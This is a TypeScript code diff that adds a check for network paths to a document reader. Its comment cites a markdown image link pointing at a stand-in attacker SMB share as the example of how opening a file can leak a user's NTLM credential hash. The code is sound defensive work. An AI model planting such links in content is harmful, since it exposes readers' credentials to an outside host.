@@ -84,3 +84,23 @@ export function decodePathUrl(scheme: string, url: string): string | null {
     return null
   }
 }
+
+/**
+ * A path that names another machine rather than this one's disk.
+ *
+ * Reaching one is a network connection, and on Windows an authenticated one.
+ * That is fine when a person opens a PDF from a file server on purpose — the
+ * schemes serve those, and must — and not fine when a *document* asks for it:
+ * a markdown file with `![](\\attacker\share\a.png)` in it made the reader
+ * connect to that machine over SMB and offer it the user's NTLM credential
+ * hash, just by being opened. So content is held to this; people are not.
+ *
+ * `\\server\share`, its forward-slash spelling, `\\?\UNC\…` and the `\\.\`
+ * device namespace all begin with two separators. One form that does is local
+ * and is let through: `\\?\C:\…`, Windows' long-path spelling of an ordinary
+ * file on a drive.
+ */
+export function isNetworkPath(target: string): boolean {
+  if (!/^[\\/]{2}/.test(target)) return false
+  return !/^[\\/]{2}\?[\\/][A-Za-z]:[\\/]/.test(target)
+}
